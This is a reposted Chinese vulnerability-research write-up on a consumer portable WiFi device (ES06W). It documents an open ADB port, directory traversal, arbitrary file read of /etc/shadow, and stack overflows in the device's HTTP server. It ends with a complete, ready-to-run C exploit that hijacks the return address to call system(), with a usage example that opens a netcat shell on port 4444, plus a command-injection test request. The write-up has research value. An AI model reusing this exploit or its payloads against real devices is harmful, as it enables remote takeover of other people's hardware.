#  实战｜对一个随身WIFI设备的漏洞挖掘   
okCryingFish  系统安全运维   2024-05-11 14:23  
  
最近买了一个随时WIFI设备，正好自己在学习漏洞挖掘，于是拿这个练练手。  
  
设备版本信息：  
```
software_version = V4565R03C01S61
hardware_version = M2V1
product_model = ES06W
upgrade_version = V4565R03C01S61
```  
  
  
首先扫描了下设备开放的端口。设备开放了22、80、443、5555、8080、9090等多个端口。SSH爆破测试了下，密码不是弱密码没什么突破。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWbkeT8ibvgn6vkyib9jqvXfj0FZwHwCo5Vyj7ThL2997p4g4O8vrQs9kA/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1 "")  
  
443、9090端口访问会返回404，可能需要其他参数，没什么突破。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWm8I3vvDd9X7SbQKQ5bPPCa8lN1uibOZASjkmyOMQMSxctmgRrMyTPHw/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1 "")  
  
设备开放了5555调试端口，可以直接通过adb连接获取设备权限。继续查找有没有其可利用的点。访问8080端口默认跳转到了  
http://192.168.0.1:8080/vad_update.html  
页面。该页面提供了设备升级、日志下载和APN设置功能。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWeCBPic4tibrfbTQ8BlQSvibsbkS3QkLPEszib5lffaIeFGXGpVzkm7xiaug/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
```
```  
  
  
查看BurpSuite历史记录，发现http://192.168.0.1/file_list.json?dir=请求比较有意思，dir指定目录，返回包返回了json格式的目录信息。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWLBibr3GIyS3D34SVmvodiaA4D22BCiaDFk96JfWUJCb9b2pr7GBsFN5CQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWhicvoz7cp7bZlGHQ7pOoDFwxOC4NYCGZXPMiaQFwScWW0AYicdiaNJRghw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
尝试通过dir参数进行目录遍历，如/file_list.json?dir=../../../../../，确认存在目  
录遍历漏洞。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWufLmf3hzhIiaDAdJBfYvPyHZ1Vgeic9rNliaAXbshPicUqUnzicic7icnQdnQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
##   
  
```
```  
  
  
继  
续查看BurpSuite历史记录，发现http://192.168.0.1/apns-conf.xml请求也比较有意思，URI指定了一个文件名，返回包是文件内容。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWRhLsWRkhXQjch977ZcW5DJEU691ToJ2x7nRpoDic3GrUbsdbVHziacZQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
于是尝试通过URI进行目录遍历读取文件，确认存在任意文件读取漏洞。这时利用任意文件读取漏洞可以读取到/etc/shadow的SSH密码了，可以尝试破解密码后直接使用SSH登录。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWyooFaib3tSic4mq0oyGUmZneL2KUEXhoHq3pmicWr6cSgcuZrCGgAo6BQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
##   
```
```  
  
  
接下来准备把HTTP服务程序拿出来分析下。设备默认开启了5555端口，可以直接通过adb连接拿到设备权限。通过看看连接状态可以确定/opt/ejoin/bin/vfd就是HTTP服务程序。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWZIyPLyWLIhgFibc5OGuBkicOJcvonAgnvZerdg48QAQMM7zyYXkPZsqQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWTyFibTcJmXgfgeG9KeGLnGQlR3PpLC3YSvJVe2IFVtRyUaUYBSOEUFA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
/opt/ejoin/bin/vfd为32位ARM架构，定位到HTTP请求解析的代码进行分析。首先尝试寻找命令注入漏洞。但是发现vfd中没有system、popen函数，执行命令是调用的sub_C1F4函数。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW4KjicpVibu5Gyp7ibEFDIhHwUlib5pPU0QugTOmMAFjuRKnnwBvyiawr1FQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
sub_C1F4函数内部调用sub_12024函数，sub_12024函数内部通过调用/opt/ejoin/var/pipe/vshd程序传递参数执行命令。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW98vPeNywVUicTkpLDswgCZ7YsLoJIRur8aTszBQqqQ9JkV6kBQZjmtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
于是查找引用sub_12024函数的地方，sub_12280和sub_12294都不能控制参数，只有sub_122A8函数中参数似乎是可控的。sub_122A8函数中将a1参数拼接到“cd %s”命令中执行。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWaXCE6E6iadoWibwS1CowgfWGxMeNELFpFvE0ESy84YOaMlhyMv4f69uw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW3PGDS2Ox3MmhQJxPCiborJEv3FoBIZfE6rXVqdL4v6QiaZibv0UexPhYw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
继续查找引用sub_122A8函数的地方，发现只有一个地址。通过调式信息来看，  
传递给sub_122A8函数的a1参数为一个目录。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWRpNA81jibNI3GoJia23O0uyAHYykj5j5nvWFcVkcPV9pXxGBs5wiaKqbQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
继续查找交叉引用，最终发现目录来自http://192.168.0.1/Uplog.html请求的filename参数。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWTRZPh4zZxn4NdQr5iacsDAlDcFyglHethKcGicOq5aibAOiabuZ0oLAT9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWmibVvyqYPHeZqPTnUFjk1rgf5nEUx48KNxh4jdNmlE4TuaPsoYKiaQ0Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
于是构造下列请求http://192.168.0.1:8080/uplog.html?filename=/etc/passwd&fileurl=123进行测试，正好WEB页面可以下载vfd日志，从日志中看出，vfd将filename指定的路径分割出目录和文件名，并切换到相应的目录并压缩文件。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW063B3V7yXnqJjialbCh0hEUtX9pcZpnocHyz98YYH7k8RspovxJicblQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
尝试构造http://192.168.0.1:8080/uplog.html?filename=/etc/;id/../../../etc/passwd&fileurl=123请求进行测试，发现代码中会对filename指向的文件是否存在进行判断，暂时没法绕过进行命令注入。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWGOB9g9yOdgKheHfphYqwYt08iboCuubEWqk3fJsicorn3eKZ3ibhOuPKA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
##   
```
```  
  
  
于是尝试查找vfd解析请求的代码中的栈溢出漏洞。发现解析  
http://192.168.0.1/file_list.json?dir=请求时，sub_EE48函数会将dir参数的内容拼接到栈空间s中，s只有256字节大小，这里存在一个栈溢出漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWLxdF0emUucz82PvNc2hN4f7jV36lyNjHcv4MeCYlGB8qedWiaic9EOaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
继续查找  
发现sub_D7A8函数在解析读取文件的请求时，直接将URI拷贝到栈空间s，s只有280字节大小，也存在栈溢出漏洞。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW28pFQCuJzWhcZbib1H2ZOm7kNTRQ1Y1kj0HP4gQm65vD56RYzMgwOhQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
##   
```
```  
  
  
这里尝试对sub_D7A8函数中的栈溢出漏洞进行利用。adb连接设备后通过gdb调式vfd程序。构造如下POC发送：  
```
http://192.168.0.1:8080/aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazaAaBaCaDaEaFaGaHaIaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZa0a1a2a3a4a5a6a7a8a9babbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzbAbBbCbDbEbFbGbHbIbJbKbLbMbNbObPbQbRbSbTbUbVbWbXbYbZb0b1b2b3b4b5b6b7b8b9cacbcccdcecfcgchcicjckclcmcncocpcqcrcsctcucvcwcxcycz
```  
  
  
根据PC寄存器地址定位到要覆盖的返回地址偏移为261。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWDl91mIYDpKMoJ00KkWVnM2WrxdGu7YKwBTyGfVWW43bjCTMmhH4iajg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
修改POC如下，就可以将PC寄存器劫持为指定的地址了。  
```
http://192.168.0.1:8080/aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazaAaBaCaDaEaFaGaHaIaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZa0a1a2a3a4a5a6a7a8a9babbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzbAbBbCbDbEbFbGbHbIbJbKbLbMbNbObPbQbRbSbTbUbVbWbXbYbZb0b1b2b3b4b5b6b7b8b9cacbcccdc123DDDD
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWXy74mKGDibVpXUaZK18nWSgqze9FT3qT4LOXrcEiacgj2u863bcWibsrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
漏洞函数在返回时执行POP {R4-R7,PC}，因此R4-R7寄存器也是可以控制的。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWVnKEBUibJyqdQfIQap7QkdCIdJfExfR6CtdvbbylLoSLrUo40Wial9Ag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
系统没有随机基址，漏洞利用较为简单，只需要避免字符串截断就行。因此直接从libc库中查找到MOV R0,SP; LDR R2,[R7]; BLX R2;指令的地址0x48d50294用来覆盖返回地址。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWCkn9SVwJDsokEATSohOFgXydm7RxaCibGgSQuvniaicQhtIKM9jiaMfIYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
漏洞函数返回后，SP指向覆盖的返回地址后面，就可以通过URL的内容来控制R0寄存器指向的字符串。R2寄存器可以用R7来控制。Libc中system函数地址为0x48CEA830。找到一个指向system函数地址的指针0x48CB5FBC来控制R7寄存器。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWHPibPyQ2edPPPrG0Z5ZEVNs81Da4bRS69WcbG2wg9pMo9tlTJa1AYDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWjicA7Af988ESonfKl7qbfAb3cYTMpJ7cMJGdGd0icyTlbL398UeiaKGog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
从新构造如下POC后调式：![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW0LYWMt1nlBktjAIib8mp3numX7V7kAmyyGAqSpB8V0zhDjlsDBUO4VQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
触发漏洞后执行到0x48d50294时，R7为控制的0x48CB5FBC。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW89q8w1Hr3q3vpahwibTx8CEpzB28oJMY5z1p4s0icl2yF0Zp47kE3XNw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
此时SP指向用来覆盖返回地址的值后面，可以将要执行的命令拼接在URL末尾来执行命令。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkW5Uyx83bOT88ibgUItrgNh7yzoDKbKglJKUiaBuTnPibUXhDUwwCShheww/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
执行到BLX R2指令时，R2就是system函数地址了。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWpwILeDnmVknvI9K13qEhhSpYmu9OXkcpLatY97JcrYTBXMgEU3CKGQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
测试EXP  
：![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2cHjnDqHrjYibMZy4UJNkWW87c2Tuu0NibeayXjQeGibzjglgHvNhp5jibSLXkRaxo3wvibQnoib3wDlQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
EXP：  
```
// ES06W-RCE.cpp :
//
#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
 
 
 
#pragma comment(lib, "ws2_32.lib")
 
void ShowHelp()
{
    printf("[+]Usage: ES06W-RCE.exe [Command]\n");
    printf("[+]Example: ES06W-RCE.exe \"nc${IFS}-lp${IFS}4444${IFS}-e${IFS}/bin/sh\"\n");
}
 
 
int main(int argc, char** argv)
{
    WSADATA stcData = {};
    int int_ret = 0;
    char str_recv[0x1000] = {};
    char str_payload_final[0x1000] = {};
 
    //
    if (argc != 2) {
        ShowHelp();
        return 0;
    }
    //
    int_ret = WSAStartup(MAKEWORD(2, 2), &stcData);
    if (int_ret == SOCKET_ERROR) {
        printf("[-]Init Failed!\n");
        return 0;
    }
    //
 
    char str_payload[] = {
        "GET /aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazaAaBaCaDaEaFaGaHa"
        "IaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZa0a1a2a3a4a5a6a7a8a9babbbcbdbebfbgbhbib"
        "jbkblbmbnbobpbqbrbsbtbubvbwbxbybzbAbBbCbDbEbFbGbHbIbJbKbLbMbNbObPbQbRbSbTb"
        "UbVbWbXbYbZb0b1b2b3b4b5b6b7b8b9cacbcccd"
        "\xBC\x5F\xCB\x48"                    //Control R7
        "\x94\x02\xD5\x48"                    //Return Addr
        "%s"                                //Command
        " HTTP/1.1\r\n"       
        "Host: 192.168.0.1:8080\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Accept-Language: zh-CN,zh;q=0.9\r\n\r\n\0"
    };
 
    sprintf_s(str_payload_final, 0x1000, str_payload, argv[1]);
 
    //
    SOCKET sock_client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in sock_addr;
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(8080);
    sock_addr.sin_addr.S_un.S_addr = inet_addr("192.168.0.1");
    //
    int nErrCode = 0;
    int_ret = connect(sock_client, (sockaddr*)&sock_addr, sizeof(sockaddr_in));
    //
    send(sock_client, str_payload_final, strlen(str_payload_final), 0);
    //
    Sleep(20);
    recv(sock_client, str_recv, sizeof(str_recv), 0);
    printf("[-]Recv: %s\n", str_recv);
 
    printf("[+]Finished!\n");
    closesocket(sock_client);
    WSACleanup();
    //
    return 0;
}
```  
```
作者：okCryingFish
来源：看雪社区https://bbs.pediy.com/user-home-780653.htm
```  
  
声明：本公众号所  
分享  
内容仅用于网安爱好者之间的技术讨论，禁止用于违法途径，**所有渗透都需获取授权**  
！  
否则需自行承担，本公众号及原作者不承担相应的后果.  
  
如有侵权，请联系删除  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpxr9XXibHdW6Eib11FYq0FDZFNMUgDMcqTyfs6iaX8OtFdlL6ypEVHCLrw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
好文推荐  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpzdIMlC9plAr8AiaQRUUvBFXZM2scib9zTnRyp0XZQxSUYAWWS0avKrCA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
[红队打点评估工具推荐](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508839&idx=1&sn=abc801070b0e44475887ddbf7273c2e7&chksm=c3087017f47ff901ecb212aadc22c5cbfc6407da79b43a6f48a355cc3fd8c5af79c113db5fd1&scene=21#wechat_redirect)  
  
  
[干货|红队项目日常渗透笔记](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247509256&idx=1&sn=76aad07a0f12d44427ce898a6ab2769e&chksm=c3087678f47fff6e2b750f41514d933390a8f97efef8ed18af7d8fb557500009381cd434ec26&scene=21#wechat_redirect)  
  
  
[实战|后台getshell+提权一把梭](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508609&idx=1&sn=f3fcd8bf0e75d43e3f26f4eec448671f&chksm=c30871f1f47ff8e74551b09f092f8673890607257f2d39c0efa314d1888a867dc718cc20b7b3&scene=21#wechat_redirect)  
  
  
[一款漏洞查找器（挖漏洞的有力工具）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247507539&idx=2&sn=317a2c6cab28a61d50b22c07853c9938&chksm=c3080d23f47f8435b31476b13df045abaf358fae484d8fbe1e4dbd2618f682d18ea44d35dccb&scene=21#wechat_redirect)  
  
  
[神兵利器 | 附下载 · 红队信息搜集扫描打点利器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508747&idx=1&sn=f131b1b522ee23c710a8d169c097ee4f&chksm=c308707bf47ff96dc28c760dcd62d03734ddabb684361bd96d2f258edb0d50e77cdb63a3600a&scene=21#wechat_redirect)  
  
  
[神兵利器 | 分享 直接上手就用的内存马（附下载）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247506855&idx=1&sn=563506565571f1784ad1cb24008bcc06&chksm=c30808d7f47f81c11b8c5f13ce3a0cc14053a77333a251cd6b2d6ba40dc9296074ae3ffd055e&scene=21#wechat_redirect)  
  
  
[推荐一款自动向hackerone发送漏洞报告的扫描器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501261&idx=1&sn=0ac4d45935842842f32c7936f552ee21&chksm=c30816bdf47f9fab5900c9bfd6cea7b1d99cd32b65baec8006c244f9041b25d080b2f23fd2c1&scene=21#wechat_redirect)  
  
  
  
**关注我，学习网络安全不迷路**  
  
  
